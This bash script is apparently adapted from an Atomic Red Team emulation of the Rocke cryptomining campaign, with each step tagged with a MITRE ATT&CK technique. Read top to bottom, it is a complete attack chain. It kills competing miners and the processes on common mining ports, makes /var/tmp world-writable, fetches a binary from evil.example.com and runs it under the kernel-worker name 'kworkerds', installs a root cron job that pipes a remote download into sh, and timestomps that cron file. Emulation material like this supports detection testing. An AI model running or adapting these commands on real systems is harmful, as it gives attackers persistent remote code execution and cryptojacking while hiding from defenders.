#!/bin/bash

# Heavily inspired by https://github.com/redcanaryco/atomic-red-team/blob/48ad5e308d7e58754fc0e3419e720e44339d0a89/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh

pkill -f kworkerds
pkill -f sourplum
pkill -f xmrig
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f minexmr
pkill -f minerd
pkill -f minergate
pkill -f kworker34
pkill -f Xbash

#   Tactic: Discovery
#   Technique: T1057 - Process Discovery
ps auxf | grep -v grep | grep -v "\_" | grep -v "kthreadd" | grep "\[.*\]" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1
ps auxf | grep -v grep | grep "xmrig" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1
ps auxf | grep -v grep | grep "Xbash" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1
ps auxf | grep -v grep | grep "stratum" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1
ps auxf | grep -v grep | grep "xmr" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1
ps auxf | grep -v grep | grep "minerd" | awk '{print $2}' | xargs kill -9 > /dev/null 2>&1

#   Tactic: Discovery
#   Technique: T1049 - System Network Connections Discovery
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :4444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1
netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs kill -9 > /dev/null 2>&1

mkdir -p /var/tmp

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permission Modification
chmod 1777 /var/tmp

#   Tactic: Defense Evasion
#   Technique: T1036 - Masquerading

curl -fsSL --connect-timeout 1 https://evil.example.com/One/c -o /var/tmp/kworkerds || wget https://evil.example.com/One/c -O /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds

nohup /var/tmp/kworkerds --cpu-load 20 --cpu 1 --keep-name > /dev/null 2>&1 &

#   Tactic: Persistence
#   Technique: T1168 - Local Job Scheduling

echo -e "0 0 * * * root (curl -fsSL --connect-timeout 1 https://evil.example.com/raw/1NtRkBc3) |sh\n##" > /etc/cron.d/oanacroner

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permission Modification
chmod 755 /etc/cron.d/oanacroner

#   Tactic: Defense Evasion
#   Technique: T1099 - Timestomp
touch -acmr /bin/sh /etc/cron.d/oanacroner
